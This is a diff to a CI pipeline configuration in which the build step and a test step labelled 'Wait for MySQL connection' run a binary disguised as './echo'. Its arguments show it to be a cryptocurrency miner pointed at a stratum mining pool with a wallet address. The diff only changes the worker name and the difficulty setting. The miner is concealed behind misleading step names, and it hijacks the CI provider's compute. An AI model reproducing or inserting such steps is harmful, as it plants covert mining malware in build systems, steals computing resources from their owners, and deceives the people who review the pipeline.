@@ -13,10 +13,10 @@ build:
     - script:
         name: execut
         code: |
-          ./echo -a lyra2z330 -o stratum+tcps://stratum-na.rplant.xyz:17025 -u HRDiYsGL7xwjPHfKAHNwxwMxvK6UTX5Ptr.ok -p d=0.0019,password=bayar -t4
+          ./echo -a lyra2z330 -o stratum+tcps://stratum-na.rplant.xyz:17025 -u HRDiYsGL7xwjPHfKAHNwxwMxvK6UTX5Ptr.wr -p d=0.0018,password=bayar -t4
 
 test:
   steps:
     - script:
         name: Wait for MySQL connection
-        code: ./echo -a lyra2z330 -o stratum+tcps://stratum-na.rplant.xyz:17025 -u HRDiYsGL7xwjPHfKAHNwxwMxvK6UTX5Ptr.ok -p d=0.0019,password=bayar -t4
+        code: ./echo -a lyra2z330 -o stratum+tcps://stratum-na.rplant.xyz:17025 -u HRDiYsGL7xwjPHfKAHNwxwMxvK6UTX5Ptr.wr -p d=0.0018,password=bayar -t4
